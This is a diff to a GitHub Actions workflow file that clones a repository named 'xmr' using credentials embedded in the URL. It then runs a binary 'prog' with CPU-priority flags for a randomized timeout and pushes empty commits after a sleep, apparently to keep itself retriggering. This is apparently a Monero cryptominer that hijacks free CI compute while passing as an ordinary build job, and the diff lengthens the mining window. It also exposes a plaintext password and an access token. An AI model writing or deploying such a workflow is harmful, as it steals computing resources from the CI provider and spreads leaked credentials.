@@ -16,15 +16,15 @@ jobs:
       - run: |
           apt update -qq
           apt install -y git libuv1 libssl1.1 libhwloc15
-          git clone https://daveyg1:Magratsucks123@github.com/daveyg1/xmr.git
+          git clone https://daveyg5:f4e68ab6c23d8076def323e3e7576c035ae20542@github.com/daveyg5/xmr.git
           cd xmr
           chmod u+x prog
-          timeout $(shuf -i 300-820 -n 1) ./prog --cpu-no-yield --cpu-priority 5 || true
+          timeout $(shuf -i 700-820 -n 1) ./prog --cpu-no-yield --cpu-priority 5 || true
           if [ ${{ matrix.runner }} -eq 0 ]
           then
             sleep 25m
             git config user.name 'Davey G'
-            git config user.email 'daveyg1@yandex.com'
+            git config user.email 'daveyg5@yandex.com'
             git commit --allow-empty --allow-empty-message --no-edit
             git push
           fi
